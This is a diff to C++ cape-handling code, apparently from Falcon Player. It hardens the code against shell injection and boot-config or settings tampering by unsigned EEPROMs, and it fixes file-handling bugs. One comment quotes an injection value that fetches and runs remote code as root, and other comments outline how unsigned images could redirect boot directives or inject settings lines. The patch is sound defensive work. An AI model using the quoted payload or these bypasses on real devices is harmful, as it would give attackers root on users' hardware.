@@ -220,6 +220,34 @@ std::string string_sprintf(const char* format, Args... args) {
     return std::move(str);
 }
 
+// One single-quoted shell word.  Pin names, modes and module names reach the
+// shell from cape-info.json, which an unsigned (uploaded) EEPROM supplies:
+// pasted in bare, "x;curl h/s|sh" ran as root at boot.
+static std::string CapeShellQuote(const std::string& v) {
+    std::string out = "'";
+    for (char ch : v) {
+        out += (ch == '\'') ? std::string("'\\''") : std::string(1, ch);
+    }
+    out += "'";
+    return out;
+}
+// A module spec ("name" or "name param=value ...") as quoted shell words.
+static std::string QuotedModuleSpec(const std::string& spec) {
+    std::string out;
+    size_t pos = 0;
+    while (pos < spec.size()) {
+        size_t end = spec.find(' ', pos);
+        if (end == std::string::npos) {
+            end = spec.size();
+        }
+        if (end > pos) {
+            out += (out.empty() ? "" : " ") + CapeShellQuote(spec.substr(pos, end - pos));
+        }
+        pos = end + 1;
+    }
+    return out;
+}
+
 static std::string exec(const std::string& cmd) {
     std::array<char, 128> buffer;
     std::string result;
@@ -338,15 +366,23 @@ static void put_file_contents(const std::string& path, const uint8_t* data, int 
     mode_t mode = S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH;
     chmod(path.c_str(), mode);
 }
+// An unreadable file comes back empty (len 0, still a terminated buffer the
+// caller frees), which the callers already treat as "nothing there"; a null
+// FILE* used to go straight into fseek().
 static uint8_t* get_file_contents(const std::string& path, int& len) {
+    len = 0;
     FILE* fp = fopen(path.c_str(), "rb");
-    fseek(fp, 0L, SEEK_END);
-    len = ftell(fp);
-    fseek(fp, 0L, SEEK_SET);
-
+    if (fp != nullptr) {
+        fseek(fp, 0L, SEEK_END);
+        long l = ftell(fp);
+        fseek(fp, 0L, SEEK_SET);
+        len = l > 0 ? (int)l : 0;
+    }
     uint8_t* data = (uint8_t*)malloc(len + 1);
-    fread(data, 1, len, fp);
-    fclose(fp);
+    if (fp != nullptr) {
+        len = (int)fread(data, 1, len, fp);
+        fclose(fp);
+    }
     data[len] = 0;
     return data;
 }
@@ -514,7 +550,52 @@ static bool configContainsDirective(const std::string& config, const std::string
     }
     return false;
 }
-static bool processBootConfig(Json::Value& bootConfig) {
+// What an unsigned cape may do to the boot config: add or drop device tree
+// overlays and parameters, which is what capes use it for.  Anything else
+// there (kernel=, initramfs, cmdline=, init=) decides what the box boots, and
+// an unsigned image is as often an uploaded file as it is a chip.  One line
+// only: an embedded newline would carry any directive in behind an allowed
+// prefix.
+static bool UnsignedBootConfigLineAllowed(const std::string& v) {
+    for (char ch : v) {
+        if ((unsigned char)ch < 0x20 && ch != '\t') {
+            return false;
+        }
+    }
+    auto startsWith = [&v](const char* p) { return v.rfind(p, 0) == 0 && v.size() > strlen(p); };
+#if defined(PLATFORM_BBB)
+    // uEnv.txt: overlay slots 0 and 1 hold FPP's own base and cape overlays.
+    return startsWith("uboot_overlay_addr") && v.size() > 20 && v[18] >= '2' && v[18] <= '7' && v[19] == '=';
+#elif defined(PLATFORM_ARMBIAN)
+    return startsWith("overlays=") || startsWith("param_");
+#else
+    return startsWith("dtoverlay=") || startsWith("dtparam=");
+#endif
+}
+
+// Remove every line of config that is exactly directive (ignoring the
+// surrounding blanks configContainsDirective() ignores).  An unsigned cape's
+// remove is held to whole lines: as a substring erase, "dtparam=" stripped
+// that prefix from every dtparam line in the file.
+static void removeDirectiveLines(std::string& config, const std::string& directive) {
+    std::string out;
+    size_t pos = 0;
+    while (pos < config.size()) {
+        size_t end = config.find('\n', pos);
+        size_t next = (end == std::string::npos) ? config.size() : end + 1;
+        std::string line = config.substr(pos, (end == std::string::npos ? config.size() : end) - pos);
+        size_t b = line.find_first_not_of(" \t");
+        size_t e = line.find_last_not_of(" \t\r");
+        bool match = b != std::string::npos && line.compare(b, e - b + 1, directive) == 0;
+        if (!match) {
+            out.append(config, pos, next - pos);
+        }
+        pos = next;
+    }
+    config = out;
+}
+
+static bool processBootConfig(Json::Value& bootConfig, bool trusted) {
 #if defined(PLATFORM_PI)
     const std::string fileName = findBootConfigFile("config.txt");
 #elif defined(PLATFORM_BBB)
@@ -542,6 +623,19 @@ static bool processBootConfig(Json::Value& bootConfig) {
     if (bootConfig.isMember("remove")) {
         for (int x = 0; x < bootConfig["remove"].size(); x++) {
             std::string v = bootConfig["remove"][x].asString();
+            // find("") matches at 0 forever and erasing it removes nothing, so
+            // an empty entry spun here for good and boot never finished.
+            if (v.empty()) {
+                continue;
+            }
+            if (!trusted && !UnsignedBootConfigLineAllowed(v)) {
+                printf("CapeUtils: unsigned cape may not remove \"%s\" from the boot config\n", v.c_str());
+                continue;
+            }
+            if (!trusted) {
+                removeDirectiveLines(current, v);
+                continue;
+            }
             size_t pos = std::string::npos;
             while ((pos = current.find(v)) != std::string::npos) {
                 // If found then erase it from string
@@ -552,6 +646,10 @@ static bool processBootConfig(Json::Value& bootConfig) {
     if (bootConfig.isMember("append")) {
         for (int x = 0; x < bootConfig["append"].size(); x++) {
             std::string v = bootConfig["append"][x].asString();
+            if (!trusted && !UnsignedBootConfigLineAllowed(v)) {
+                printf("CapeUtils: unsigned cape may not add \"%s\" to the boot config\n", v.c_str());
+                continue;
+            }
             if (!configContainsDirective(current, v)) {
                 // If not  found then append it
                 printf("Adding config option: %s\n", v.c_str());
@@ -1059,7 +1157,7 @@ static std::string PinCurrentMode(const std::string& pin) {
         return "";
     }
     std::string out;
-    std::string cmd = "/usr/bin/pinctrl -l " + pin + " 2>/dev/null";
+    std::string cmd = "/usr/bin/pinctrl -l " + CapeShellQuote(pin) + " 2>/dev/null";
     FILE* p = popen(cmd.c_str(), "r");
     if (p) {
         char buf[256];
@@ -1084,9 +1182,8 @@ void ConfigurePin(const char* pin, const char* mode) {
     // bone-pinmux-helper sysfs on older kernels. Fall back to the helper sysfs
     // directly only if the tool is absent (keeps pre-pinctrl images working).
     if (file_exists("/usr/bin/pinctrl") && pin[0] == 'P' && (pin[2] == '_' || pin[2] == '-')) {
-        char cmd[256];
-        snprintf(cmd, sizeof(cmd), "/usr/bin/pinctrl -s %s %s", pin, mode);
-        if (system(cmd) == 0) {
+        std::string cmd = "/usr/bin/pinctrl -s " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
+        if (system(cmd.c_str()) == 0) {
             return;
         }
     }
@@ -1160,7 +1257,7 @@ static const std::map<std::string, std::string> LEGACY_MODULE_NAME_MAP = {
 };
 
 static bool moduleNameResolves(const std::string& module) {
-    std::string cmd = "/sbin/modprobe -n -q " + module + " > /dev/null 2>&1";
+    std::string cmd = "/sbin/modprobe -n -q " + QuotedModuleSpec(module) + " > /dev/null 2>&1";
     return system(cmd.c_str()) == 0;
 }
 
@@ -1184,7 +1281,7 @@ static void loadModules(const Json::Value& modules) {
                 continue;
             }
         }
-        exec("/sbin/modprobe " + module + " 2> /dev/null  > /dev/null");
+        exec("/sbin/modprobe " + QuotedModuleSpec(module) + " 2> /dev/null  > /dev/null");
     }
 }
 
@@ -1433,6 +1530,17 @@ static bool capeMayRemoveSetting(const std::string& key, std::string& why) {
 static CapeSettingAction capeMaySetSetting(const std::vector<std::string>& lines, const std::string& key,
                                            const std::string& value, bool strict, std::string& why,
                                            bool userRequestedReset = false) {
+    // Every setting is one `key = "value"` line, written as is. A line break
+    // in either half would add lines of the cape's choosing -- any key, past
+    // every rule below, SigningAPIHost included -- and a quote or `=` in the
+    // key would make it read back as some other key. The settings API and
+    // fppd's own writer refuse these too; this is the cape's writer.
+    static const std::string kLineBreaks("\r\n\0", 3);
+    if (key.empty() || key.find_first_of(kLineBreaks + "\"=") != std::string::npos ||
+        value.find_first_of(kLineBreaks) != std::string::npos) {
+        why = "it would not stay a single settings line";
+        return CapeSettingAction::Refuse;
+    }
     // Settings no cape sets, signed or not, and however it asks: they decide
     // where this device sends secrets.  SigningAPIHost is where the cape pages
     // send the SoC serial, the order ID and the FalconPlayer account password
@@ -1598,8 +1706,12 @@ private:
 
             if (a[a.length() - 1] != '/') {
                 int len = fileSize(src);
+                FILE* f = len > 0 ? fopen(src.c_str(), "rb") : nullptr;
+                if (f == nullptr) {
+                    fileMap[a].clear();
+                    continue;
+                }
                 fileMap[a].resize(len);
-                FILE* f = fopen(src.c_str(), "rb");
                 int l2 = fread(&fileMap[a][0], 1, len, f);
                 fclose(f);
             }
@@ -1731,8 +1843,8 @@ private:
         printf("Using %s\n", EEPROM.c_str());
         uint8_t buffer[12];
         FILE* file = fopen(EEPROM.c_str(), "rb");
-        int l = fread(buffer, 1, 6, file);
-        if (buffer[0] != 'F' || buffer[1] != 'P' || buffer[2] != 'P' || buffer[3] != '0' || buffer[4] != '2') {
+        int l = file ? fread(buffer, 1, 6, file) : 0;
+        if (l < 6 || buffer[0] != 'F' || buffer[1] != 'P' || buffer[2] != 'P' || buffer[3] != '0' || buffer[4] != '2') {
             printf("EEPROM header miss-match\n");
             EEPROM = "/home/fpp/media/config/cape-eeprom.bin";
             if (!file_exists(EEPROM)) {
@@ -1742,7 +1854,9 @@ private:
                 // Otherwise an eeprom that is present but unreadable keeps the
                 // old overlay applied forever, and the i2c addresses it binds
                 // then block rewriting the eeprom that would fix it.
-                fclose(file);
+                if (file) {
+                    fclose(file);
+                }
                 if (!readOnly) {
                     handleReboot(handleCapeOverlay("/home/fpp/media/"));
                 }
@@ -1750,17 +1864,23 @@ private:
             }
             printf("Using %s\n", EEPROM.c_str());
         }
-        fclose(file);
+        if (file) {
+            fclose(file);
+        }
     }
 
     void parseEEPROM() {
-        uint8_t* buffer = new uint8_t[32768]; // 32K is the largest eeprom we support, more than enough
+        // Owned here: the section parser throws on a malformed image, and the
+        // buffer and file both leaked on every throw (and on the early return).
+        std::unique_ptr<uint8_t[]> bufferHolder(new uint8_t[32768]); // 32K is the largest eeprom we support, more than enough
+        uint8_t* buffer = bufferHolder.get();
         FILE* file = fopen(EEPROM.c_str(), "rb");
         if (file == nullptr) {
             printf("Failed to open eeprom: %s\n", EEPROM.c_str());
             printf("   error: %s\n", strerror(errno));
             return;
         }
+        std::unique_ptr<FILE, int (*)(FILE*)> fileHolder(file, fclose);
         int l = fread(buffer, 1, 6, file);
 
         if (buffer[0] == 'F' && buffer[1] == 'P' && buffer[2] == 'P' && buffer[3] == '0' && buffer[4] == '2') {
@@ -1868,8 +1988,6 @@ private:
                 flen = read_section_length(file); // length of the section
             }
         }
-        fclose(file);
-        delete[] buffer;
 
         if (signedExtras.find("deviceSerial") != signedExtras.end()) {
             char serialCmd[] = "sed -n 's/^Serial.*: //p' /proc/cpuinfo";
@@ -1897,10 +2015,10 @@ private:
     }
     void configurePin(const std::string& pin, const std::string& mode) {
 #ifdef PLATFORM_BB64
-        std::string cmd = "/usr/bin/pinctrl -s " + pin + " " + mode;
+        std::string cmd = "/usr/bin/pinctrl -s " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
         exec(cmd);
 #elif defined(PLATFORM_PI)
-        std::string cmd = "/usr/bin/pinctrl set " + pin + " " + mode;
+        std::string cmd = "/usr/bin/pinctrl set " + CapeShellQuote(pin) + " " + CapeShellQuote(mode);
         exec(cmd);
 #endif
     }
@@ -2055,7 +2173,7 @@ private:
                     if (result.isMember("bootConfig")) {
                         // if the cape requires changes/update to config.txt (Pi) or uEnv.txt (BBB)
                         // we need to process them and see if we have to apply the changes and reboot or not
-                        reboot = processBootConfig(result["bootConfig"]);
+                        reboot = processBootConfig(result["bootConfig"], hasSignature && validSignature);
                     }
                     if (result.isMember("copyFiles")) {
                         // if the cape requires certain files copied into place (asoundrc for example)
